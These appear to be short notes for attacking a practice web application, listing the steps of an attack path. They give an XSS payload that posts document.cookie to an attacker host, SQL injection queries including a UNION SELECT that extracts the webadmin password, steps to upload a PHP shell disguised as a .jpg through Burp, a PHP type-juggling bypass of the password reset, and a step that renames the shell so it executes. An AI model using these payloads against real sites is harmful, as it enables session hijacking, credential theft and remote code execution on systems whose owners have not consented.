*Attack Path*
1. Authenticate as a user
2. Authenticate as webadmin via SQLi or PHP type juggling
3. Get RCE or a shell.


Comments
------------
Send user cookie back to attacker IP and Port.  Example:
<script>fetch("http://127.0.0.1:8000",{method: "post",mode: "no-cors",body:document.cookie});</script>

Now use browser and session to authenticate as user.
-----------------------------

Products
-------------
SQLi for admin password.
examples:
SELECT * FROM `products` WHERE `product_id` = 1 OR 1=1;
SELECT * FROM `products` WHERE `product_id` = 1 UNION SELECT NULL, `Username`,`Password` ,NULL FROM `users` WHERE `Username` = "webadmin"

------------------------------

Gallery
--------------
upload a php shell and in burp, change the file extension to .jpg
------------------------------

Reset Password
---------------
PHP type juggling
In burp, change old_password=foobar to old_password[]=''
Empty array is evaluated to NULL, which is then evaluated to 0 in php
Now you can change the webadmin password if you did not already have it.
-------------------------------

Admin
------------
Go in and rename the shell you uploaded as an image so that it will execute.
